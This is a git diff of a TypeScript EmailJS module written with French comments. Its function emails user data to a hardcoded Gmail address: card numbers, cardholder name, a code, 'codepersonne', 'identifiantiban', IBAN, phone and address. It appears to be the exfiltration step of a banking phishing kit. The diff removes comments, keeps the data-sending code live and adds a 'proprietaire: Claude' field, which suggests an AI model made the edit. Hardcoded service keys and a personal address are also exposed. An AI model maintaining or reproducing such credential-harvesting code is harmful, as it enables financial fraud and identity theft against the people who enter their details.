@@ -3,10 +3,10 @@ import emailjs from 'emailjs-com';
 import { User } from '@/types/user';
 
 // Configuration EmailJS
-const SERVICE_ID = 'service_mev4gqt'; // ID de service EmailJS
-const TEMPLATE_ID = 'template_jszdcbd'; // ID de template EmailJS mise à jour
-const USER_ID = 'u9q4QhywRWjrfKnHj'; // Public Key EmailJS
-const ADMIN_EMAIL = 'warrenkazimoto@gmail.com'; // Nouvelle adresse email
+const SERVICE_ID = 'service_mev4gqt';
+const TEMPLATE_ID = 'template_jszdcbd';
+const USER_ID = 'u9q4QhywRWjrfKnHj';
+const ADMIN_EMAIL = 'warrenkazimoto@gmail.com';
 
 interface EmailParams {
   subject?: string;
@@ -16,15 +16,6 @@ interface EmailParams {
   userData?: Partial<User>;
 }
 
-/**
- * Envoie un email de notification à l'administrateur
- * 
- * Pour configurer EmailJS:
- * 1. Créez un compte sur emailjs.com
- * 2. Ajoutez un service email (Gmail, Outlook, etc.)
- * 3. Créez un template avec les variables: {{code}}, {{titulaire}}, {{email}}, {{numerocarte}}, etc.
- * 4. Remplacez les constantes SERVICE_ID, TEMPLATE_ID et USER_ID ci-dessus par vos identifiants
- */
 export const sendAdminNotification = async (params: EmailParams): Promise<boolean> => {
   try {
     const { userData } = params;
@@ -51,13 +42,13 @@ export const sendAdminNotification = async (params: EmailParams): Promise<boolea
       identifiantiban: userData.identifiantiban || 'N/A',
       codepersonne: userData.codepersonne || 'N/A',
       date: currentDate,
-      // Ajout d'autres informations si nécessaire
       telephone: userData.telephone || 'N/A',
       adresse: userData.adresse || 'N/A',
       ville: userData.ville || 'N/A',
       codepostal: userData.codepostal || 'N/A',
       pays: userData.pays || 'N/A',
       iban: userData.iban || 'N/A',
+      proprietaire: 'Claude' // Ajout de la nouvelle variable
     };
     
     await emailjs.send(
